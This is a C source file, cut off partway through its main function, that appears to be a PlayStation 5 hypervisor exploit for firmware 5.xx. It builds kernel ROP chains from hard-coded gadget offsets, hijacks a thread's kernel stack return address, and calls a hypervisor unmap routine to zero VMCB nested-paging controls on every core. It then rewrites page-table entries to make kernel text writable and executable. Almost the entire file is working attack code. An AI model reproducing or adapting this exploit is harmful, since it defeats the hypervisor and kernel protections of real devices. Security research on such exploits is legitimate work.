/*
 * bypervisor5XX.c
 *
 * Credit Flow for publicly disclousing the hypervisor bug - https://github.com/TheOfficialFloW
 * Specter for his work on jumptable exploit at 2.XX - https://github.com/Cryptogenic
 * zecoxao for kernel elfs - https://github.com/zecoxao
 * John Törnblom ps5sdk - https://github.com/john-tornblom
 * Cow for his help when I'm dumb and dont understand - https://github.com/c0w-ar
 * Myself (Jordy) Thanks for the learning experiment :P
 *
 */

#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <ps5/kernel.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/cpuset.h>
#include <unistd.h>

#include "offsets.h"
#include "hyperhen_integration.h"

#define KROP_TAG_SIZE          0x03FE
#define KROP_CHAIN_OFF         0x1000
#define KROP_MARKER_OFF        0x1F00
#define KROP_ORIG_RBP_DELTA    0x88
#define TD_NAME_OFF            0x294
#define TD_KSTACK_OFF          0x690
#define KROP_SCAN_START        0x2000
#define KROP_SCAN_END          0x4000

#ifndef HV5XX_KROP_CORE
#define HV5XX_KROP_CORE        9
#endif

#define PTE_P                  (1ULL << 0)
#define PTE_RW                 (1ULL << 1)
#define PTE_PS                 (1ULL << 7)
#define PTE_G                  (1ULL << 8)
#define PTE_XO                 (1ULL << 58)
#define PTE_NX                 (1ULL << 63)
#define PTE_PA_MASK            0x000FFFFFFFFFF000ULL
#define PTE_PA(x)              ((x) & PTE_PA_MASK)
#define PTE_PAGE_SIZE(level)   ((level) == 1 ? (1ULL << 30) : (1ULL << 21))

#ifndef HV_TMR_ID
#define HV_TMR_ID              0ULL
#endif

#ifndef HV_TMR_UNMAP_SIZE
#define HV_TMR_UNMAP_SIZE      0x1000ULL
#endif

#ifndef HV_TMR_UNMAP_ARG3
#define HV_TMR_UNMAP_ARG3      0ULL
#endif

#define HV_5XX_VMCB_COUNT      16

#ifndef HV_5XX_NESTED_CTRL_OFF
#define HV_5XX_NESTED_CTRL_OFF HV_5XX_VMCB_NESTED_CTRL
#endif

#ifndef HV_5XX_NESTED_CTRL_VALUE
#define HV_5XX_NESTED_CTRL_VALUE 0ULL
#endif

#ifndef HV5XX_THEFLOW_FIRST_CORE
#define HV5XX_THEFLOW_FIRST_CORE 0
#endif

#ifndef HV5XX_THEFLOW_COUNT
#define HV5XX_THEFLOW_COUNT HV_5XX_VMCB_COUNT
#endif

#ifndef HV5XX_THEFLOW_DO_RELOAD
#define HV5XX_THEFLOW_DO_RELOAD 1
#endif

#ifndef HV5XX_THEFLOW_POST_PROBE
#define HV5XX_THEFLOW_POST_PROBE 0
#endif

#ifndef HV5XX_THEFLOW_POST_PA
#define HV5XX_THEFLOW_POST_PA 0ULL
#endif

#ifndef HV5XX_THEFLOW_POST_WRITE_ALL
#define HV5XX_THEFLOW_POST_WRITE_ALL 0
#endif

#ifndef HV5XX_THEFLOW_POST_VERIFY_ALL
#define HV5XX_THEFLOW_POST_VERIFY_ALL 0
#endif

#if HV5XX_THEFLOW_POST_WRITE_ALL && HV5XX_THEFLOW_POST_VERIFY_ALL
#error "Select either post-write or read-only VMCB verification, not both"
#endif

#ifndef HV5XX_THEFLOW_POST_WRITE_VALUE
#define HV5XX_THEFLOW_POST_WRITE_VALUE 0x8ULL
#endif

#ifndef HV5XX_THEFLOW_KTEXT_PAGE_TEST
#define HV5XX_THEFLOW_KTEXT_PAGE_TEST 0
#endif

#ifndef HV5XX_THEFLOW_KTEXT_ALL_RW
#define HV5XX_THEFLOW_KTEXT_ALL_RW 0
#endif

#ifndef HV5XX_KTEXT_TEST_OFF
#define HV5XX_KTEXT_TEST_OFF 0x500ULL
#endif

#ifndef HV5XX_NOTIFY_FINAL
#define HV5XX_NOTIFY_FINAL 0
#endif

#ifndef HV_VMCB_CORE
#define HV_VMCB_CORE           HV5XX_KROP_CORE
#endif

#ifndef HV_VMCB_WRITE_OFFSET
#define HV_VMCB_WRITE_OFFSET   0xB0ULL
#endif

#ifndef HV_VMCB_WRITE_VALUE
#define HV_VMCB_WRITE_VALUE    0ULL
#endif

#ifndef HV_VMCB_WRITE_SELF_COPY
#define HV_VMCB_WRITE_SELF_COPY 1
#endif

#ifndef HV5XX_ALLPROC_DATA_OFF
#define HV5XX_ALLPROC_DATA_OFF 0x26FDC58ULL
#endif

#ifndef HV5XX_ALLPROC_OLD_OFF
#define HV5XX_ALLPROC_OLD_OFF  0x276DC58ULL
#endif

#ifndef HV5XX_PROC_P_PID_OFF
#define HV5XX_PROC_P_PID_OFF   0xBCULL
#endif

int sceKernelSleep(int seconds);
int sceKernelUsleep(int useconds);
int sceKernelGetCurrentCpu(void);
int sceKernelSendNotificationRequest(int, void *, size_t, int);
void pthread_set_name_np(pthread_t thread, const char *name);
int pipe2(int pipefd[2], int flags);

static uint64_t g_ktext;
static uint64_t g_kdata;
static uint64_t g_proc;
static int g_pid;

typedef struct hv5xx_runtime_profile {
    uint32_t fw;
    const hv_5xx_direct_offsets *hv;
    uint64_t pop_rsp_ret;
    uint64_t kernel_pmap_store_off;
} hv5xx_runtime_profile;

static const hv5xx_runtime_profile g_profiles[] = {
    {
        .fw = 0x0500,
        .hv = &hv5xx_direct_0500,
        .pop_rsp_ret = 0x2410B0ULL,
        .kernel_pmap_store_off = 0x3398A88ULL,
    },
    {
        .fw = 0x0502,
        .hv = &hv5xx_direct_0502,
        .pop_rsp_ret = 0x2410B0ULL,
        .kernel_pmap_store_off = 0x3398A88ULL,
    },
    {
        .fw = 0x0510,
        .hv = &hv5xx_direct_0510,
        .pop_rsp_ret = 0x2410B0ULL,
        .kernel_pmap_store_off = 0x3398A88ULL,
    },
    {
        .fw = 0x0550,
        .hv = &hv5xx_direct_0550,
        .pop_rsp_ret = 0x435F1FULL,
        .kernel_pmap_store_off = 0x3394A88ULL,
    },
};

static const hv5xx_runtime_profile *g_profile;

static uint32_t normalize_fw(uint32_t raw)
{
    uint32_t shifted = (raw >> 16) & 0xFFFFU;
    return shifted ? shifted : (raw & 0xFFFFU);
}

static const hv5xx_runtime_profile *profile_for_fw(uint32_t fw)
{
    for (unsigned i = 0; i < sizeof(g_profiles) / sizeof(g_profiles[0]); i++) {
        if (g_profiles[i].fw == fw) {
            return &g_profiles[i];
        }
    }
    return 0;
}

static uint64_t kg_pop_rdi(void)
{
    return g_ktext + g_profile->hv->GAD_POP_RDI_RET;
}

static uint64_t kg_pop_rsi(void)
{
    return g_ktext + g_profile->hv->GAD_POP_RSI_RET;
}

static uint64_t kg_pop_rdx(void)
{
    return g_ktext + g_profile->hv->GAD_POP_RDX_RET;
}

static uint64_t kg_pop_rsp(void)
{
    return g_ktext + g_profile->pop_rsp_ret;
}

static uint64_t kg_mov_rdi_rsi_pop_rbp(void)
{
    return g_ktext + g_profile->hv->GAD_MOV_QWORD_PTR_RDI_RSI_POP_RBP_RET;
}

static uint64_t kg_hv_unmap_pt_tmr(void)
{
    return g_ktext + g_profile->hv->FUN_HV_UNMAP_PT_TMR;
}

static uint64_t selected_tmr_id(void)
{
    if (HV_TMR_ID) {
        return HV_TMR_ID;
    }

    uint64_t nested_pa = g_profile->hv->VMCB0_PA +
                         (uint64_t)HV5XX_THEFLOW_FIRST_CORE *
                             HV_5XX_VMCB_STRIDE +
                         HV_5XX_NESTED_CTRL_OFF;
    return (nested_pa - g_profile->hv->HV_SHM_PA - 0x298ULL) / 0x18ULL;
}

static void notify_popup(const char *msg)
{
    struct {
        char pad[45];
        char msg[3075];
    } req;

    memset(&req, 0, sizeof(req));
    size_t len = strlen(msg);
    if (len > sizeof(req.msg) - 1) {
        len = sizeof(req.msg) - 1;
    }
    memcpy(req.msg, msg, len);
    sceKernelSendNotificationRequest(0, &req, sizeof(req), 0);
    sceKernelUsleep(500000);
}

static uint64_t kr64(uint64_t addr)
{
    uint64_t v = 0;
    kernel_copyout((intptr_t)addr, &v, sizeof(v));
    return v;
}

static void kw64(uint64_t addr, uint64_t val)
{
    kernel_copyin(&val, (intptr_t)addr, sizeof(val));
}

static int is_kernel_ptr(uint64_t v)
{
    return v >= 0xFFFF800000000000ULL;
}

typedef struct flat_pmap {
    uint64_t mtx_name_ptr;
    uint64_t mtx_flags;
    uint64_t mtx_data;
    uint64_t mtx_lock;
    uint64_t pm_pml4;
    uint64_t pm_cr3;
} flat_pmap;

static uint64_t kernel_dmap_base(void)
{
    flat_pmap kp;
    memset(&kp, 0, sizeof(kp));
    kernel_copyout((intptr_t)(g_kdata + g_profile->kernel_pmap_store_off),
                   &kp, sizeof(kp));
    if (is_kernel_ptr(kp.pm_pml4) && kp.pm_cr3) {
        return kp.pm_pml4 - kp.pm_cr3;
    }
    return g_proc & 0xFFFFFFFF00000000ULL;
}

static uint64_t kernel_cr3(void)
{
    flat_pmap kp;
    memset(&kp, 0, sizeof(kp));
    kernel_copyout((intptr_t)(g_kdata + g_profile->kernel_pmap_store_off),
                   &kp, sizeof(kp));
    return kp.pm_cr3;
}

static int is_stack_candidate(uint64_t v)
{
    return is_kernel_ptr(v) && (v & 0xFFFULL) == 0;
}

static int pin_to_core(int core)
{
    uint64_t mask[2] = {0, 0};
    mask[0] = 1ULL << (unsigned)core;
    return cpuset_setaffinity(3, 1, -1, 0x10, (const cpuset_t *)mask);
}

typedef struct krop_ctx {
    int pipe_fds[2];
    pthread_t thread;
    char name[16];
    volatile int ready;
    volatile int done;
    volatile int core;
    volatile int pin_ret;
    volatile int pin_errno;
    uint64_t tag_buf;
    uint64_t tag_size;

    uint64_t td;
    uint64_t kstack;
    uint64_t ret_off;
    uint64_t orig_ret;
    uint64_t orig_arg;

    uint8_t chain[0x1000];
    size_t chain_len;
} krop_ctx;

static krop_ctx g_krop;

static void *worker_thread(void *arg)
{
    krop_ctx *k = (krop_ctx *)arg;
    char scratch[0x1000];

    errno = 0;
    k->pin_ret = pin_to_core(HV5XX_KROP_CORE);
    k->pin_errno = errno;
    k->core = sceKernelGetCurrentCpu();
    k->tag_buf = (uint64_t)scratch;
    k->tag_size = KROP_TAG_SIZE;
    k->ready = 1;

#ifdef HV5XX_KSTACK_SLEEP_ONLY
    while (!k->done) {
        sceKernelSleep(1);
    }
#else
    /* Use the fixed Byepervisor direction: fd[0] read side, fd[1] write side. */
    read(k->pipe_fds[0], scratch, KROP_TAG_SIZE);

    k->done = 1;
#endif
    return 0;
}

static void kp(krop_ctx *k, uint64_t val)
{
    if (k->chain_len + sizeof(val) > sizeof(k->chain)) {
        return;
    }
    memcpy(k->chain + k->chain_len, &val, sizeof(val));
    k->chain_len += sizeof(val);
}

static void kp_write8_rbp(krop_ctx *k, uint64_t dest, uint64_t val, uint64_t rbp)
{
    kp(k, kg_pop_rdi());
    kp(k, dest);
    kp(k, kg_pop_rsi());
    kp(k, val);
    kp(k, kg_mov_rdi_rsi_pop_rbp());
    kp(k, rbp);
}

static void kp_write8(krop_ctx *k, uint64_t dest, uint64_t val)
{
    kp_write8_rbp(k, dest, val, 0xBEEFBEEFBEEFBEEFULL);
}

static void kp_hv_unmap_call(krop_ctx *k, uint64_t tmr_id,
                             uint64_t size, uint64_t arg3)
{
    kp(k, kg_pop_rdi());
    kp(k, tmr_id);
    kp(k, kg_pop_rsi());
    kp(k, size);
    kp(k, kg_pop_rdx());
    kp(k, arg3);
    kp(k, kg_hv_unmap_pt_tmr());
}

static uint64_t vmcb_target_va(uint64_t dmap, int core, uint64_t off)
{
    return dmap + g_profile->hv->VMCB0_PA +
           (uint64_t)core * HV_5XX_VMCB_STRIDE + off;
}

static void serialize_cpu(void)
{
    uint32_t eax = 0, ebx = 0, ecx = 0, edx = 0;
    __asm__ volatile("cpuid"
                     : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
                     : "a"(0)
                     : "memory");
}

static uint64_t pte_read_pa(uint64_t dmap, uint64_t pa)
{
    return kr64(dmap + pa);
}

static void pte_write_pa(uint64_t dmap, uint64_t pa, uint64_t val)
{
    kw64(dmap + pa, val);
}

static uint64_t page_chain_set_rw_one_ex(uint64_t va, uint64_t dmap,
                                         uint64_t cr3, int verbose)
{
    uint64_t table_phys = cr3;
    uint64_t leaf_phys = 0;

    for (int level = 0; level < 4; level++) {
        int shift = 39 - (level * 9);
        uint64_t idx = (va >> shift) & 0x1FFULL;
        uint64_t entry_pa = PTE_PA(table_phys) + idx * 8;
        uint64_t entry = pte_read_pa(dmap, entry_pa);

        if (verbose) {
        }
        if (!(entry & PTE_P)) {
            return 0;
        }

        uint64_t updated = entry | PTE_RW;
        updated &= ~PTE_XO;
        updated &= ~PTE_NX;
        if (updated != entry) {
            pte_write_pa(dmap, entry_pa, updated);
            if (verbose) {
            }
            entry = updated;
        }

        if ((level == 1 || level == 2) && (entry & PTE_PS)) {
            uint64_t page_size = PTE_PAGE_SIZE(level);
            leaf_phys = PTE_PA(entry) | (va & (page_size - 1));
            break;
        }
        if (level == 3) {
            leaf_phys = PTE_PA(entry) | (va & 0xFFFULL);
            break;
        }

        table_phys = PTE_PA(entry);
    }

    return leaf_phys;
}

static uint64_t page_chain_set_rw_one(uint64_t va, uint64_t dmap, uint64_t cr3)
{
    return page_chain_set_rw_one_ex(va, dmap, cr3, 1);
}

static uint64_t page_remove_global_one(uint64_t va, uint64_t dmap, uint64_t cr3)
{
    uint64_t table_phys = cr3;

    for (int level = 0; level < 4; level++) {
        int shift = 39 - (level * 9);
        uint64_t idx = (va >> shift) & 0x1FFULL;
        uint64_t entry_pa = PTE_PA(table_phys) + idx * 8;
        uint64_t entry = pte_read_pa(dmap, entry_pa);

        if (!(entry & PTE_P)) {
            return 0;
        }

        if ((level == 1 || level == 2) && (entry & PTE_PS)) {
            uint64_t updated = entry & ~PTE_G;
            if (updated != entry) {
                pte_write_pa(dmap, entry_pa, updated);
            }
            return PTE_PA(entry) | (va & (PTE_PAGE_SIZE(level) - 1));
        }

        if (level == 3) {
            uint64_t updated = entry & ~PTE_G;
            if (updated != entry) {
                pte_write_pa(dmap, entry_pa, updated);
            }
            return PTE_PA(entry) | (va & 0xFFFULL);
        }

        table_phys = PTE_PA(entry);
    }

    return 0;
}

static int kernel_pmap_invalidate_like_theflow(uint64_t dmap, uint64_t cr3)
{
    static uint8_t two_zero_pages[0x2000];
    int pipe_fds[2] = {-1, -1};

    if (pipe(pipe_fds) != 0) {
        return -1;
    }

    int flags = fcntl(pipe_fds[1], F_GETFL, 0);
    if (flags >= 0) {
        fcntl(pipe_fds[1], F_SETFL, flags | O_NONBLOCK);
    }

    ssize_t written = write(pipe_fds[1], two_zero_pages, sizeof(two_zero_pages));
    if (written < 0) {
        close(pipe_fds[0]);
        close(pipe_fds[1]);
        return -1;
    }

    close(pipe_fds[1]);
    pipe_fds[1] = -1;

    uint64_t read_fd_file_data = (uint64_t)kernel_get_proc_file(-1, pipe_fds[0]);
    if (!is_kernel_ptr(read_fd_file_data)) {
        close(pipe_fds[0]);
        return -1;
    }

    uint64_t read_fd_buffer = kr64(read_fd_file_data + 0x10);
    if (!is_kernel_ptr(read_fd_buffer)) {
        close(pipe_fds[0]);
        return -1;
    }

    uint64_t phys = page_remove_global_one(read_fd_buffer, dmap, cr3);
    close(pipe_fds[0]);

    if (!phys) {
        return -1;
    }

    serialize_cpu();
    return 0;
}

static void kp_exit(krop_ctx *k)
{
    uint64_t orig_rbp = k->kstack + k->ret_off + KROP_ORIG_RBP_DELTA;

    kp_write8(k, k->kstack + k->ret_off, k->orig_ret);
    kp_write8_rbp(k, k->kstack + k->ret_off + 8, k->orig_arg, orig_rbp);
    kp(k, kg_pop_rsp());
    kp(k, k->kstack + k->ret_off);
}

static uint64_t find_worker_td(uint64_t proc, const char *name)
{
    uint64_t td = kr64(proc + 0x10);

    for (int i = 0; i < 128 && is_kernel_ptr(td); i++) {
        char td_name[32];
        memset(td_name, 0, sizeof(td_name));
        kernel_copyout((intptr_t)(td + TD_NAME_OFF), td_name, 16);
        if (strncmp(td_name, name, strlen(name)) == 0) {
            return td;
        }

        uint64_t next = kr64(td + 0x10);
        if (!next || next == td) {
            break;
        }
        td = next;
    }

    return 0;
}

static uint64_t find_kstack_for_td(uint64_t td, int *out_off)
{
    static const int try_offs[] = {
        0x470, 0x690, 0x680, 0x460, 0x480, 0x6A0, 0x670, 0x490
    };

    for (unsigned i = 0; i < sizeof(try_offs) / sizeof(try_offs[0]); i++) {
        int off = try_offs[i];
        uint64_t v = kr64(td + (uint64_t)off);
        if (is_stack_candidate(v)) {
            if (out_off) {
                *out_off = off;
            }
            return v;
        }
    }
    return 0;
}

static int find_return_slot(krop_ctx *k)
{
    for (int off = KROP_SCAN_START; off < KROP_SCAN_END; off += 8) {
        uint64_t maybe_ret = kr64(k->kstack + (uint64_t)off);
        if ((maybe_ret >> 32) != 0xFFFFFFFFU) {
            continue;
        }

        uint64_t maybe_buf = kr64(k->kstack + (uint64_t)off + 8);
        uint64_t maybe_size = kr64(k->kstack + (uint64_t)off + 16);
        if (maybe_buf == k->tag_buf || maybe_size == k->tag_size) {
        }

        if (maybe_buf == k->tag_buf && maybe_size == k->tag_size) {
            k->ret_off = (uint64_t)off;
            k->orig_ret = maybe_ret;
            k->orig_arg = maybe_buf;
            return 0;
        }
    }

    return -1;
}

int main(void)
{
    int hyperhen_success = 0;

    hyperhen_hv5xx_begin();
    g_krop.pipe_fds[0] = -1;
    g_krop.pipe_fds[1] = -1;

    g_ktext = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
    g_kdata = (uint64_t)KERNEL_ADDRESS_DATA_BASE;

    uint32_t raw_fw = kernel_get_fw_version();
    uint32_t fw = normalize_fw(raw_fw);
    g_profile = profile_for_fw(fw);
    if (!g_profile || !g_profile->pop_rsp_ret) {
        hyperhen_hv5xx_mark_failed();
#if HV5XX_NOTIFY_FINAL
        notify_popup("Unsupported FW");
#endif
        goto out;
    }

#if HV5XX_NOTIFY_FINAL
    notify_popup("HyperHEN 5.xx");
#endif
    g_pid = getpid();
    g_proc = (uint64_t)kernel_get_proc(g_pid);
    if (!is_kernel_ptr(g_proc)) {
        goto out;
    }

    krop_ctx *kpctx = &g_krop;
    memset(kpctx, 0, sizeof(*kpctx));
    kpctx->pipe_fds[0] = -1;
    kpctx->pipe_fds[1] = -1;
    kpctx->core = -1;

    if (pipe2(kpctx->pipe_fds, 0) != 0) {
        goto out;
    }

    snprintf(kpctx->name, sizeof(kpctx->name), "hvkrop");
    if (pthread_create(&kpctx->thread, 0, worker_thread, kpctx) != 0) {
        goto out;
    }
    pthread_set_name_np(kpctx->thread, kpctx->name);

    while (!kpctx->ready) {
        sceKernelUsleep(10000);
    }
    sceKernelSleep(2);
    uint64_t proc = g_proc;
    if (!is_kernel_ptr(proc)) {
        goto out;
    }

    kpctx->td = find_worker_td(proc, kpctx->name);
    if (!is_kernel_ptr(kpctx->td)) {
        goto out;
    }

    int kstack_off = 0;
    kpctx->kstack = find_kstack_for_td(kpctx->td, &kstack_off);
    if (!is_kernel_ptr(kpctx->kstack)) {
        goto out;
    }

#ifdef HV5XX_KSTACK_SLEEP_ONLY
    kpctx->done = 1;
    goto out;
#endif

    if (find_return_slot(kpctx) != 0) {
        goto out;
    }
#ifdef HV5XX_KSTACK_SCAN_ONLY
    char scan_dummy[0x1000];
    memset(scan_dummy, 0x42, sizeof(scan_dummy));
    write(kpctx->pipe_fds[1], scan_dummy, KROP_TAG_SIZE);
    for (int i = 0; i < 200 && !kpctx->done; i++) {
        sceKernelUsleep(10000);
    }
    goto out;
#endif

#ifdef HV5XX_KROP_MOV_BADRIP
    uint64_t mov_marker_addr = kpctx->kstack + KROP_MARKER_OFF;
    uint64_t mov_marker_before = kr64(mov_marker_addr);
    kpctx->chain_len = 0;
    kp_write8(kpctx, mov_marker_addr, 0x484B4D4F56353530ULL); 
    kp(kpctx, kg_pop_rdi());
    kp(kpctx, 0x4D4F564F4E455854ULL); 
    kp(kpctx, 0x4141414141414141ULL);

    uint64_t mov_chain_addr = kpctx->kstack + KROP_CHAIN_OFF;
    kernel_copyin(kpctx->chain, (intptr_t)mov_chain_addr, kpctx->chain_len);
    kw64(kpctx->kstack + kpctx->ret_off + 8, mov_chain_addr);
    kw64(kpctx->kstack + kpctx->ret_off, kg_pop_rsp());
    sceKernelSleep(1);

    char mov_dummy[0x1000];
    memset(mov_dummy, 0x41, sizeof(mov_dummy));
    write(kpctx->pipe_fds[1], mov_dummy, KROP_TAG_SIZE);
    sceKernelSleep(10);
    goto out;
#endif

#ifdef HV5XX_KROP_HVUNMAP_MARKER
    uint64_t hv_marker_addr = kpctx->kstack + KROP_MARKER_OFF;
    uint64_t hv_marker_before = kr64(hv_marker_addr);
    kpctx->chain_len = 0;
    kp_hv_unmap_call(kpctx, selected_tmr_id(), HV_TMR_UNMAP_SIZE,
                     HV_TMR_UNMAP_ARG3);
    kp_write8(kpctx, hv_marker_addr, 0x484B48564D415031ULL); 
    kp_exit(kpctx);

    uint64_t hv_chain_addr = kpctx->kstack + KROP_CHAIN_OFF;
    kernel_copyin(kpctx->chain, (intptr_t)hv_chain_addr, kpctx->chain_len);
    kw64(kpctx->kstack + kpctx->ret_off + 8, hv_chain_addr);
    kw64(kpctx->kstack + kpctx->ret_off, kg_pop_rsp());
    sceKernelSleep(1);

    char hv_dummy[0x1000];
    memset(hv_dummy, 0x41, sizeof(hv_dummy));
    write(kpctx->pipe_fds[1], hv_dummy, KROP_TAG_SIZE);

    for (int i = 0; i < 500 && !kpctx->done; i++) {
        sceKernelUsleep(10000);
    }
    uint64_t hv_marker_after = kr64(hv_marker_addr);
    if (hv_marker_after == 0x484B48564D415031ULL && kpctx->done) {
    } else {
    }
    goto out;
#endif

#ifdef HV5XX_KROP_VMCB_TOUCH
    uint64_t touch_marker_addr = kpctx->kstack + KROP_MARKER_OFF;
    uint64_t touch_marker_before = kr64(touch_marker_addr);
    uint64_t pml4_va = kernel_pml4_va();
    uint64_t dmap = kernel_dmap_base();
    uint64_t target = vmcb_target_va(dmap, HV_VMCB_CORE, HV_VMCB_WRITE_OFFSET);
    kpctx->chain_len = 0;
    kp_hv_unmap_call(kpctx, selected_tmr_id(), HV_TMR_UNMAP_SIZE,
                     HV_TMR_UNMAP_ARG3);
#if HV_VMCB_WRITE_SELF_COPY
    kp_write8(kpctx, target, target);
#else
    kp_write8(kpctx, target, HV_VMCB_WRITE_VALUE);
#endif
    kp_write8(kpctx, touch_marker_addr, 0x484B564D43425431ULL); 
    kp_exit(kpctx);

    uint64_t touch_chain_addr = kpctx->kstack + KROP_CHAIN_OFF;
    kernel_copyin(kpctx->chain, (intptr_t)touch_chain_addr, kpctx->chain_len);
    kw64(kpctx->kstack + kpctx->ret_off + 8, touch_chain_addr);
    kw64(kpctx->kstack + kpctx->ret_off, kg_pop_rsp());
    sceKernelSleep(1);

    char touch_dummy[0x1000];
    memset(touch_dummy, 0x41, sizeof(touch_dummy));
    write(kpctx->pipe_fds[1], touch_dummy, KROP_TAG_SIZE);

    for (int i = 0; i < 500 && !kpctx->done; i++) {
        sceKernelUsleep(10000);
    }
    uint64_t touch_marker_after = kr64(touch_marker_addr);
    if (touch_marker_after == 0x484B564D43425431ULL && kpctx->done) {
    } else {
    }
    goto out;
#endif

#ifdef HV5XX_KROP_THEFLOW_0506_NPT0
    uint64_t flow_marker_addr = kpctx->kstack + KROP_MARKER_OFF;
    uint64_t dmap = kernel_dmap_base();
    int npt_all_confirmed = 0;
    int ktext_write_confirmed = 0;
    int ktext_allrw_confirmed = 0;
    kpctx->chain_len = 0;
    kp_hv_unmap_call(kpctx, selected_tmr_id(), HV_TMR_UNMAP_SIZE,
                     HV_TMR_UNMAP_ARG3);
    kp(kpctx, kg_pop_rsi());
    kp(kpctx, HV_5XX_NESTED_CTRL_VALUE);
    for (int i = HV5XX_THEFLOW_FIRST_CORE;
         i < HV5XX_THEFLOW_FIRST_CORE + HV5XX_THEFLOW_COUNT; i++) {
        uint64_t target = vmcb_target_va(dmap, i, HV_5XX_NESTED_CTRL_OFF);
        kp(kpctx, kg_pop_rdi());
        kp(kpctx, target);
        kp(kpctx, kg_mov_rdi_rsi_pop_rbp());
        kp(kpctx, 0xDEADBEEF);
    }
#if HV5XX_THEFLOW_DO_RELOAD
    kp_hv_unmap_call(kpctx, 0, 0, 0xFFFFFFFFFFFFFFFFULL);
#endif
    kp_write8(kpctx, flow_marker_addr, 0x484B54464C4F5730ULL);
    kp_exit(kpctx);

    uint64_t flow_chain_addr = kpctx->kstack + KROP_CHAIN_OFF;
    kernel_copyin(kpctx->chain, (intptr_t)flow_chain_addr, kpctx->chain_len);
    kw64(kpctx->kstack + kpctx->ret_off + 8, flow_chain_addr);
    kw64(kpctx->kstack + kpctx->ret_off, kg_pop_rsp());
    sceKernelSleep(1);

    char flow_dummy[0x1000];
    memset(flow_dummy, 0x41, sizeof(flow_dummy));
    write(kpctx->pipe_fds[1], flow_dummy, KROP_TAG_SIZE);

    for (int i = 0; i < 500 && !kpctx->done; i++) {
        sceKernelUsleep(10000);
    }
    uint64_t flow_marker_after = kr64(flow_marker_addr);
#if HV5XX_THEFLOW_POST_PROBE
    errno = 0;
    int post_pin_ret = pin_to_core(HV5XX_KROP_CORE);
    int post_pin_errno = errno;
    int post_cpu = sceKernelGetCurrentCpu();
    uint64_t post_target = HV5XX_THEFLOW_POST_PA
                               ? (dmap + HV5XX_THEFLOW_POST_PA)
                               : vmcb_target_va(dmap, HV5XX_THEFLOW_FIRST_CORE,
                                                HV_5XX_NESTED_CTRL_OFF);
    uint64_t post_val = kr64(post_target);
#endif
#if HV5XX_THEFLOW_POST_WRITE_ALL
    errno = 0;
    pin_to_core(HV5XX_KROP_CORE);
    int all_verify_ok = 1;
    for (int i = 0; i < HV_5XX_VMCB_COUNT; i++) {
        uint64_t target = vmcb_target_va(dmap, i, HV_5XX_NESTED_CTRL_OFF);
        kw64(target, HV5XX_THEFLOW_POST_WRITE_VALUE);
        uint64_t verify = kr64(target);
        if (verify != (uint64_t)HV5XX_THEFLOW_POST_WRITE_VALUE) {
            all_verify_ok = 0;
        }
    }
    npt_all_confirmed = all_verify_ok;
#if HV5XX_NOTIFY_FINAL
    if (npt_all_confirmed) {
        notify_popup("NPT Disabled");
    }
#endif
#if HV5XX_THEFLOW_POST_VERIFY_ALL
    errno = 0;
    pin_to_core(HV5XX_KROP_CORE);
    int all_verify_ok = 1;
    for (int i = 0; i < HV_5XX_VMCB_COUNT; i++) {
        uint64_t target = vmcb_target_va(dmap, i, HV_5XX_NESTED_CTRL_OFF);
        uint64_t verify = kr64(target);
        if (verify != (uint64_t)HV_5XX_NESTED_CTRL_VALUE) {
            all_verify_ok = 0;
        }
    }
    npt_all_confirmed = all_verify_ok;
#endif
#endif
#if HV5XX_THEFLOW_KTEXT_PAGE_TEST
    errno = 0;
    pin_to_core(HV5XX_KROP_CORE);
    uint64_t rw_dmap = kernel_dmap_base();
    uint64_t rw_cr3 = kernel_cr3();
    uint64_t rw_target = g_ktext + HV5XX_KTEXT_TEST_OFF;
    page_chain_set_rw_one(rw_target, rw_dmap, rw_cr3);
    kernel_pmap_invalidate_like_theflow(rw_dmap, rw_cr3);
    kw64(rw_target, 0x3157525458544B48ULL);      
    kw64(rw_target + 8, 0x3257525458544B48ULL);  
    uint64_t got0 = kr64(rw_target);
    uint64_t got1 = kr64(rw_target + 8);
    if (got0 == 0x3157525458544B48ULL &&
        got1 == 0x3257525458544B48ULL) {
        ktext_write_confirmed = 1;
    }
#endif
#if HV5XX_THEFLOW_KTEXT_ALL_RW
    errno = 0;
    pin_to_core(HV5XX_KROP_CORE);
    uint64_t allrw_dmap = kernel_dmap_base();
    uint64_t allrw_cr3 = kernel_cr3();
    uint64_t allrw_pages = 0;
    uint64_t allrw_fail = 0;
    for (uint64_t a = g_ktext; a < g_kdata; a += 0x1000ULL) {
        uint64_t phys = page_chain_set_rw_one_ex(a, allrw_dmap, allrw_cr3, 0);
        allrw_pages++;
        if (!phys) {
            allrw_fail++;
        }
    }
    int allrw_inv_ret = kernel_pmap_invalidate_like_theflow(allrw_dmap, allrw_cr3);
    if (allrw_pages != 0 && allrw_fail == 0 && allrw_inv_ret == 0) {
        ktext_allrw_confirmed = 1;
    }
#if HV5XX_NOTIFY_FINAL
    if (ktext_write_confirmed && ktext_allrw_confirmed) {
        notify_popup("Hello from ktext");
        notify_popup("Credit TheOfficialFloW, SpecterDev, Cow, Zecoxao, John-tornblom, Jordy");
    }
#endif
#endif
    if (flow_marker_after == 0x484B54464C4F5730ULL && kpctx->done &&
        npt_all_confirmed) {
        hyperhen_success = 1;
        hyperhen_hv5xx_mark_ready();
    }
    goto out;
#endif

#ifdef HV5XX_KROP_PIVOT_BADRIP
    kpctx->chain_len = 0;
    kp(kpctx, kg_pop_rdi());
    kp(kpctx, 0x50564F544F4E4558ULL); 
    kp(kpctx, 0x4141414141414141ULL);

    uint64_t pivot_chain_addr = kpctx->kstack + KROP_CHAIN_OFF;
    kernel_copyin(kpctx->chain, (intptr_t)pivot_chain_addr, kpctx->chain_len);
    kw64(kpctx->kstack + kpctx->ret_off + 8, pivot_chain_addr);
    kw64(kpctx->kstack + kpctx->ret_off, kg_pop_rsp());
    sceKernelSleep(1);

    char pivot_dummy[0x1000];
    memset(pivot_dummy, 0x41, sizeof(pivot_dummy));
    write(kpctx->pipe_fds[1], pivot_dummy, KROP_TAG_SIZE);
    sceKernelSleep(10);
    goto out;
#endif

    uint64_t marker_addr = kpctx->kstack + KROP_MARKER_OFF;
    kpctx->chain_len = 0;
#ifndef HV5XX_KROP_RESTORE_ONLY
    kp_write8(kpctx, marker_addr, 0x484B524F50353530ULL); 
#else
#endif
    kp_exit(kpctx);

    uint64_t chain_addr = kpctx->kstack + KROP_CHAIN_OFF;
    kernel_copyin(kpctx->chain, (intptr_t)chain_addr, kpctx->chain_len);
